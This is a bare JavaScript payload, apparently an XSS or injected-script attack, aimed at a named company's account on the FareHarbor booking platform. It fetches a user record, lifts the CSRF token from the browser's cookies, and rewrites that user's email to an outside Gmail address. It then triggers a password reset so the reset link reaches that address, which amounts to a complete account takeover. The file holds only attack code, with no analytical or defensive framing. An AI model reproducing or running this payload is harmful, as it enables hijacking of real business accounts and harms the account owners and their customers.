var xhrg = new XMLHttpRequest();
xhrg.open('GET', 'https://fareharbor.com/api/v1/companies/chinaholidaysaud/users/chinaholidays/', true);
xhrg.onload = function() {
  if (xhrg.status === 200) {
    var user = JSON.parse(xhrg.responseText).user;
    const csrf = document.cookie.match(/csrftoken=([^;]*)/)[1];
    var xhr = new XMLHttpRequest();
    xhr.open('PUT', 'https://fareharbor.com/api/v1/companies/chinaholidaysaud/users/'+ user.username +'/', true);
    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
    xhr.setRequestHeader('X-Csrftoken', csrf);
    xhr.setRequestHeader('Referer', 'https://fareharbor.com/chinaholidaysaud/dashboard/settings/permissions/users/'+ user.username +'/settings/');
    
    // Set the request payload
    xhr.send(JSON.stringify({
      "username": user.username,
      "name": user.name,
      "is_inactive": "activated",
      "email": "akberbadsha05@gmail.com",
      "group": user.group.pk,
      "partner_group": user.partner_group.pk
    }));
    var reset = new XMLHttpRequest();
    reset.open('POST', 'https://fareharbor.com/api/v1/forgot/password/', true);
    reset.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
    reset.setRequestHeader('X-Csrftoken', csrf);
    reset.setRequestHeader('Referer', 'https://fareharbor.com/forgot/password/');
    reset.send(JSON.stringify({"shortname":user.shortname,"username":user.username}));

  } else {
    console.error('Error:', xhrg.statusText);
  }
};
xhrg.send();
alert('Done');
